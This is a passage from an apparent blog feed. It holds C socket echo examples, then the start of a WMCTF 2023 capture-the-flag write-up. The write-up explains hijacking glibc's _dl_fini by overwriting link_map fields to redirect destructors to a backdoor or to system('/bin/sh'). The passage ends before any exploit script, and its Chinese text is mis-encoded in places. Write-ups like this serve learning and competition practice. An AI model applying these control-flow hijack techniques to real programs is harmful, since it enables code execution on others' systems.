class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">       <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">       <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">       <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">       <span class="comment">// ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span></span><br><span class="line">       <span class="comment">//                 struct sockaddr *src_addr, socklen_t *addrlen);</span></span><br><span class="line">       <span class="comment">//ä»å¥—æ¥å­—è¯»å–æ•°æ®,æŠŠå‘é€æ–¹çš„ip:portç­‰æ”¾å…¥clientSockaddr</span></span><br><span class="line">       recvfrom(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">                (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">              ntohs(clientSockaddr.sin_port));</span><br><span class="line">      <span class="comment">//  ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,</span></span><br><span class="line">      <span class="comment">//                 const struct sockaddr *dest_addr, socklen_t addrlen);</span></span><br><span class="line">      stringLow2Upper(buffer);</span><br><span class="line">      sendto(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span> =</span> &#123;</span><br><span class="line">        .sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">        .sin_port = htons(PORT),</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//åˆ›å»ºsocket</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(serverSockaddr);</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    sendto(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">           (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, length);</span><br><span class="line">    recvfrom(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">             (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, &amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,recvBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TCPâ€“linux-C"><a href="#TCPâ€“linux-C" class="headerlink" title="TCPâ€“linux C"></a>TCPâ€“linux C</h3><p>TCPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">string</span>[i] = <span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct sockaddr_in &#123;</span></span><br><span class="line"><span class="comment">ã€€ã€€ short int sin_family; Address family</span></span><br><span class="line"><span class="comment">    unsigned short int sin_port; Port number</span></span><br><span class="line"><span class="comment">    struct in_addr sin_addr;  Internet address</span></span><br><span class="line"><span class="comment">    unsigned char sin_zero[8]; Same size as struct sockaddr</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">ã€€ã€€*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;  <span class="comment">//åœ°å€ç°‡</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ç½‘ç»œå­—èŠ‚åºé€šå¸¸æ˜¯å¤§ç«¯å­—èŠ‚åº,linuxå°ç«¯åº</span></span><br><span class="line"><span class="comment">    hton:host to network</span></span><br><span class="line"><span class="comment">    uint16_t htons(uint16_t hostlong) 16ä½ä»ä¸»æœºå­—èŠ‚é¡ºåºè½¬æ¢æˆç½‘ç»œå­—èŠ‚é¡ºåº</span></span><br><span class="line"><span class="comment">    uint32_t htonl(uint32_t hostlong) 32ä½åŒä¸Š</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// IPåœ°å€</span></span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);               <span class="comment">//ç«¯å£</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//ç»‘å®šsocket</span></span><br><span class="line">    <span class="comment">// int bind(int  sockfd, const struct sockaddr * addr, socklen_t  len)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TCPç›‘å¬ç«¯å£</span></span><br><span class="line">    <span class="keyword">if</span> (listen(serverSocket, MAXQUEUE) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">        <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">        <span class="comment">// Int accept(int sockfd,  struct sockaddr *restrict  addr, socklen_t</span></span><br><span class="line">        <span class="comment">// *restrict  len)</span></span><br><span class="line">        <span class="comment">//é˜»å¡ç­‰å¾…tcpè¿æ¥,è¿”å›è¿æ¥çš„socket</span></span><br><span class="line">        <span class="type">int</span> connectionSocket =</span><br><span class="line">            accept(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">        <span class="keyword">if</span> (connectionSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">               ntohs(clientSockaddr.sin_port));</span><br><span class="line">        <span class="comment">//å‘å¥—æ¥å­—æ¥å—æ•°æ®</span></span><br><span class="line">        <span class="comment">// int recv(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        recv(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buffer);</span><br><span class="line">        stringLow2Upper(buffer);</span><br><span class="line">        <span class="comment">//å‘å¥—æ¥å­—å‘é€æ•°æ®</span></span><br><span class="line">        <span class="comment">// Int send(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        send(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        close(connectionSocket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// int connect(int  sockfd, const struct sockaddr  *addr,  socklen_t  len);</span></span><br><span class="line">    <span class="comment">//åˆ©ç”¨å¥—æ¥å­—å’Œç›®æ ‡ä¸»æœºå»ºç«‹tcpè¿æ¥</span></span><br><span class="line">    <span class="keyword">if</span> (connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                <span class="keyword">sizeof</span>(serverSockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;string--&gt;STRING&quot;</span>);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">//å‘é€æ•°æ®</span></span><br><span class="line">    send(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//æ¥å—æ•°æ®</span></span><br><span class="line">    recv(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(recvBuffer);</span><br><span class="line">    close(clientSocket);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 WMCTF</title>
      <link href="/2023/08/28/2023wmctf/"/>
      <url>/2023/08/28/2023wmctf/</url>
      
        <content type="html"><![CDATA[<h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/w/blindless&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/wmctf/blindless/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ç»™äº†åé—¨å‡½æ•°ï¼ŒexecuteBrainfuckå‡½æ•°å¯ä»¥æ ¹æ®è¾“å…¥çš„codeï¼Œå®ç°ä»¥mallocçš„dataä¸ºåŸºå‡†çš„ä»»æ„é«˜åœ°å€å†™æ•°æ®ï¼Œdataå¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥mmapåˆ°libcå›ºå®šåç§»å¤„</p><h2 id="dl-fini"><a href="#dl-fini" class="headerlink" title="_dl_fini"></a>_dl_fini</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//å‚æ•°: mainå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//å‚æ•°: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//å‚æ•°: init ELFçš„æ„é€ å‡½æ•°</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//å‚æ•°: fini ELFçš„ææ„å‡½æ•°</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//å‚æ•°: rtld_fini ldçš„ææ„å‡½æ•°</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//å‚æ•°: æ ˆé¡¶</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831174521411.png" alt="image-20230831174521411"></p><p>å¤šä¸ªæ„é€ å‡½æ•°æ—¶å­˜æ”¾åœ¨.init_arrayä¸­ï¼Œinit(ä¸€èˆ¬å°±æ˜¯__libc_csu_init)å°±è´Ÿè´£éå†.init_arrayæ¥æ‰§è¡Œå¤šä¸ªæ„é€ å‡½æ•°</p><p>å¤šä¸ªææ„å‡½æ•°æ”¾åœ¨.fini_arrayä¸­ä½†æ˜¯fini(ä¸€èˆ¬æ˜¯__libc_csu_fini)æ˜¯ä¸ªç©ºå‡½æ•°</p><p><img src="/2023/08/28/2023wmctf/image-20230831174746076.png" alt="image-20230831174746076"></p><p>ææ„å°±ç”±ldçš„ææ„å‡½æ•° rtdl_finiè´Ÿè´£ï¼Œrdl_finiå®é™…æŒ‡å‘_dl_fini()å‡½æ•°ï¼Œè¢«ç¼–è¯‘åˆ°ld.so.2ä¸­</p><p>ld.so.2ä¼šé€šè¿‡dl_open()æŠŠæ‰€éœ€æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ä¸­, ä»–ä¼šæŠŠæ‰€æœ‰æ˜ å°„çš„æ–‡ä»¶éƒ½è®°å½•åœ¨ç»“æ„ä½“**_rtld_global**ä¸­ï¼Œè¿›ç¨‹ç»ˆæ­¢, ld.so.2éœ€è¦å¸è½½æ‰€æ˜ å°„çš„æ¨¡å—, è¿™éœ€è¦è°ƒç”¨æ¯ä¸€ä¸ªéå…±äº«æ¨¡å—çš„fini_arraryæ®µä¸­çš„ææ„å‡½æ•°</p><blockquote><p>Linux Namespacesæœºåˆ¶ï¼šnamespaceå°±æ˜¯ä¸€ä¸ªè¿›ç¨‹çš„é›†åˆ, è¿™ä¸ªè¿›ç¨‹é›†åˆä¸­å¯ä»¥çœ‹åˆ°ç›¸åŒçš„å…¨å±€èµ„æº</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span>//æè¿°å‘½åç©ºé—´</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//æ¯ä¸ªæ¨¡å—ç”¨_ns_loadedæè¿°, è¿™ä¸ªå‘½åç©ºé—´ä¸­æ‰€æ˜ å°„çš„æ¨¡å—ç»„æˆä¸€ä¸ªåŒå‘é“¾è¡¨, _ns_loadedå°±æ˜¯è¿™ä¸ªé“¾è¡¨çš„æŒ‡é’ˆ</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">        <span class="comment">/* _ns_loadedä¸­æœ‰å¤šå°‘æ¨¡å— */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br></pre></td></tr></table></figure><p>link_map *_ns_loaded ç”¨æ¥æè¿°è¿›ç¨‹æ˜ å°„çš„ä¸€ä¸ªæ¨¡å—</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;<span class="comment">/* æ¨¡å—åœ¨å†…å­˜ä¸­çš„çš„åŸºåœ°å€ */</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* æ¨¡å—çš„æ–‡ä»¶å  */</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;<span class="comment">/* æŒ‡å‘ELFä¸­çš„DynamicèŠ‚ */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span><span class="comment">/* åŒå‘é“¾è¡¨æŒ‡é’ˆ */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span><span class="comment">/* åŒå‘é“¾è¡¨æŒ‡é’ˆ */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns; <span class="comment">/* è¿™ä¸ªæ¨¡å—æ‰€å±NameSapceçš„idx  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info é‡Œé¢åŒ…å«çš„å°±æ˜¯åŠ¨æ€é“¾æ¥çš„å„ä¸ªèŠ‚çš„ä¿¡æ¯</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELFçš„å¤´è¡¨  */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* ELFå…¥å£ç‚¹  */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* å¤´è¡¨ä¸­æœ‰å¤šå°‘èŠ‚  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamicèŠ‚ä¸­æœ‰å¤šå°‘æè¿°ç¬¦  *</span></span><br><span class="line"><span class="comment">    .......</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *64ä½ç¨‹åºå 8bit ç”¨äºåŒºåˆ†å„ç§æŒ‡å®šä¿¡æ¯ç±»å‹çš„æ ‡è®°ï¼Œè¯¥ç»“æ„ä¸­çš„å…±ç”¨ä½“æ ¹æ®è¯¥æ ‡å¿—è¿›è¡Œè§£é‡Š/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>ä½ç¨‹åºå <span class="number">8b</span>it æˆ–è€…ä¿å­˜ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œæˆ–è€…ä¿å­˜ä¸€ä¸ªæ•´æ•°ï¼Œå¯ä»¥æ ¹æ®ç‰¹å®šçš„æ ‡å¿—è¿›è¡Œè§£é‡Šã€‚</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831195723378.png" alt="image-20230831195723378"></p><p>_dl_finiéå†rtld_globalä¸­æ‰€æœ‰çš„å‘½åç©ºé—´ï¼Œéå†å‘½åç©ºé—´ä¸­æ‰€æœ‰çš„æ¨¡å—ï¼Œæ‰¾åˆ°è¿™ä¸ªæ¨¡å—çš„fini_arrayæ®µ, å¹¶è°ƒç”¨å…¶ä¸­çš„æ‰€æœ‰å‡½æ•°æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span><span class="comment">//æœ‰ææ„å‡½æ•°</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">              ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)<span class="comment">//fini_arrayå¤šä¸ªææ„å‡½æ•°</span></span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">      <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)<span class="comment">//finiææ„å‡½æ•°</span></span><br><span class="line">    DL_CALL_DT_FINI</span><br><span class="line">      (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>.fini_arrayåœ°å€<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>,åŒæ—¶æ§åˆ¶l-&gt;l_info[DT_FINI_ARRAYSZ]å¤§äº0å³å¯ï¼Œæ‰§è¡Œ.fini_arryé‡Œå‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°</p><p>æˆ–è€…ç›´æ¥æ§åˆ¶l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptrï¼Œç›´æ¥æ‰§è¡Œåœ°å€å¤„å‡½æ•°</p><p>l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptråŸæœ¬æ˜¯æŒ‡å‘</p><p><img src="/2023/08/28/2023wmctf/image-20230901011053856.png" alt="image-20230901011053856"></p><p>æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹l-&gt;l_addrä½¿l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr+l-&gt;l_addræŒ‡å‘backdoorï¼ŒåŒæ—¶l-&gt;l_info[DT_FINI_ARRAY]ä¿®æ”¹ä¸º0ï¼Œå³å¯</p><blockquote><p>å¦ä¸€ç§æ–¹æ³•ï¼šè°ƒç”¨ææ„å‡½æ•°æ—¶ç”±äºrdiæ˜¯å›ºå®šçš„åœ°å€(libc2.31ä¸º _rtld_global+2312)ï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶rdiä¸º&#x2F;bin&#x2F;shï¼Œfiniä¸ºsystemåœ°å€æˆ–è€…æŠŠ.fini_arryæŒ‡å‘system gotè¡¨</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 